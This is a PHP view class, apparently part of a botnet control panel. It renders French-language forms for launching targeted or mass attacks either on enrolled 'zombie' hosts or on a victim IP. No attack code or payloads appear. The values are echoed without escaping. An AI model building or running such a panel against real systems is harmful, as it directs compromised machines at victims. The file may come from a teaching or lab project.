<?php


class VueAttaque
{

    public function choixAttaqueMassive()
    {
       
    }

    public function choixAttaqueCibleeZombie($attaques_zombies, $zombies)
    {
        ?>
        <div class="main-panel">        
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Attaque ciblée sur Zombie</h4>
                  <form class="forms-sample" action="/attaques/attaque-cible-zombie" method="POST">
                    <div class="form-group">
                    <div class="form-group">

                      <label>Attaque :</label>
                      <select class="form-select" name="choix_attaque" id="selectattack">
                        <?php 
                        foreach ($attaques_zombies as $attaque) {
                          ?>
                          <option value="<?php echo $attaque['attaque_possible']?>"><?php echo $attaque['attaque_possible']?></option>
                        <?php } ?>
                      </select>
                    </div>
                    </div>

                    <div class="form-group">
                      <label>Cible :</label>
                      
                      <select name="choix_zombie" class="form-select" >
                      <?php 
                        foreach ($zombies as $zombie) {
                          ?>
                          <option value="<?php echo $zombie['hostname']?>"><?php echo $zombie['hostname']?></option>
                        <?php } ?>
                      </select>
                    </div> 
                    <button type="submit" class="btn btn-success me-2">Attaquer</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <?php
    }

    public function choixAttaqueCibleeVictime($attaques_victime)
    {
        ?>
        <div class="main-panel">        
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Attaque ciblée sur victime</h4>
                  <form class="forms-sample" action="/attaques/attaque-cible-victime" method="POST">
                    <div class="form-group">
                      <label>Attaque :</label>
                      <div class="form-group">
                      <select class="form-select" name="choix_attaque" id="selectattack">
                        <?php 
                        foreach ($attaques_victime as $attaque) {
                          ?>
                          <option value="<?php echo $attaque['attaque_possible']?>"><?php echo $attaque['attaque_possible']?></option>
                        <?php } ?>
                      </select>
                      </div>
                    </div>
                    <div class="form-group">
                      <label>Cible (IP) :</label>
                      <div class="form-group">
                        <input name="ip" type="text" class="form-control form-control-lg" id="ip" placeholder="IP">
                      </div>
                    </div> 

                    <button type="submit" class="btn btn-success me-2">Attaquer</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <?php
    }

    public function choixAttaqueMassiveZombie($attaques_zombies)
    {
        ?>
        <div class="main-panel">        
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Attaque massive sur tout les Zombies</h4>
                  <form class="forms-sample" action="/attaques/attaque-massive-zombie" method="POST">
                    <div class="form-group">
                    <div class="form-group">

                      <label>Attaque :</label>
                      <select class="form-select" name="choix_attaque" id="selectattack">
                        <?php 
                        foreach ($attaques_zombies as $attaque) {
                          ?>
                          <option value="<?php echo $attaque['attaque_possible']?>"><?php echo $attaque['attaque_possible']?></option>
                        <?php } ?>
                      </select>
                    </div>
                    </div>
                    <button type="submit" class="btn btn-success me-2">Attaquer</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <?php
    }

    public function choixAttaqueMassiveVictime($attaques_victime)
    {
        ?>
        <div class="main-panel">        
        <div class="content-wrapper">
          <div class="row">
            <div class="col-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Attaque massive sur victime</h4>
                  <form class="forms-sample" action="/attaques/attaque-massive-victime" method="POST">
                    <div class="form-group">
                      <label>Attaque :</label>
                      <div class="form-group">
                      <select class="form-select" name="choix_attaque" id="selectattack">
                        <?php 
                        foreach ($attaques_victime as $attaque) {
                          ?>
                          <option value="<?php echo $attaque['attaque_possible']?>"><?php echo $attaque['attaque_possible']?></option>
                        <?php } ?>
                      </select>
                      </div>
                    </div>
                    <div class="form-group">
                      <label>Cible (IP) :</label>
                      <div class="form-group">
                        <input name="ip" type="text" class="form-control form-control-lg" id="ip" placeholder="IP">
                      </div>
                    </div> 

                    <button type="submit" class="btn btn-success me-2">Attaquer</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <?php
    }

}